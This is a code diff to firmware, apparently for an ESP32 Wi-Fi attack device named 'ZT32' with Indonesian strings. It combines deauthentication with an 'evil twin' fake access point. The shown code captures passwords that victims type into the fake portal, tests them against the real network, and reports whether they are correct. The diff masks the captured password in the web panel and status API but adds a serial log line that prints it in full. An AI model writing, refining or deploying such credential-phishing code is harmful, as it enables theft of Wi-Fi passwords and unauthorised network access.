@@ -340,7 +340,7 @@ String panelHtml(){
   h += "<script>setInterval(async function(){try{let s=await (await fetch('/api/status')).json();"
        "document.getElementById('mon').textContent='up '+s.up+'s | heap '+s.heap+' | target '+s.target"
        "+' | deauth '+s.deauth+' | twin '+s.twin+' | pkt '+s.pkt+' | btn '+s.btn+' ('+s.btnRaw+')"
-       "+' | pass '+(s.pass||'-');}catch(e){}},2000);</script>";
+       "+' | pass '+(s.pass?'***':'-');}catch(e){}},2000);</script>";
   h += "</div></body></html>";
   return h;
 }
@@ -411,7 +411,7 @@ void handleStatus(){
              ",\"twin\":\"" + (twinOn ? "ON" : "off") + "\"" +
              ",\"pkt\":" + String(sentFrames) +
              ",\"btn\":\"" + String(btnLast) + "\",\"btnRaw\":" + String(btnRaw) +
-             ",\"pass\":\"" + tryPass + "\",\"ssid\":\"" + String(apSsid) + "\"" +
+             ",\"pass\":\"" + (tryPass.length() ? "***" : "") + "\",\"ssid\":\"" + String(apSsid) + "\"" +
              ",\"aps\":" + String(apCount) + "}";
   web.send(200, "application/json", s);
 }
@@ -425,7 +425,7 @@ void handleResult(){
       "<body><h2>You entered wrong password</h2><p>Try again...</p></body></html>");
     return;
   }
-  correctInfo = "Password untuk " + String(aps[targetIdx].ssid) + "<br>Hasil: " + tryPass;
+  correctInfo = "Password untuk " + String(aps[targetIdx].ssid) + "<br>Hasil: *** (tersimpan di serial)";
   deauthOn = false;
   oledStatus("pass BENAR");
   if(twinOn) stopTwin();
@@ -493,6 +493,7 @@ void handleRoot(){
 
   if(twinOn && web.hasArg("password")){
     tryPass = web.arg("password");
+    Serial.println("[ZT32] PASS captured (disembunyikan di UI): " + tryPass);
     WiFi.disconnect();
     WiFi.begin(aps[targetIdx].ssid, tryPass.c_str(), aps[targetIdx].ch, aps[targetIdx].bssid);
     oledStatus("coba pass...");
